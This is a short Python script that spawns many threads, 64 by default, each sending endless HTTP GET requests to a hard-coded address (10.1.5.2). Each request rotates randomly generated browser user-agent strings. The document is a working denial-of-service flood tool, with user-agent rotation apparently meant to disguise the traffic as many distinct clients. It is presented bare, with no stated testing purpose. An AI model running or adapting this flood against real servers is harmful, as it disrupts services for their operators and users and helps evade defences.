import requests
import random
import threading
import sys
import signal

from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem

user_agent_rotator = UserAgent(software_names=[SoftwareName.CHROME.value], operating_systems=[OperatingSystem.LINUX.value], limit=100)

def handler(signum, frame):
    sys.exit(0)

signal.signal(signal.SIGINT, handler)

if len(sys.argv) > 1:
    threads = int(sys.argv[1])
else:
    threads = 64

target_ip = "10.1.5.2"

def thread_function():
    while True:
        requests.get(f"http://{target_ip}/{random.randint(1, 10)}.html", headers={
            "User-Agent": user_agent_rotator.get_random_user_agent(),
        })

for i in range(threads):
    x = threading.Thread(target=thread_function, args=())
    x.start()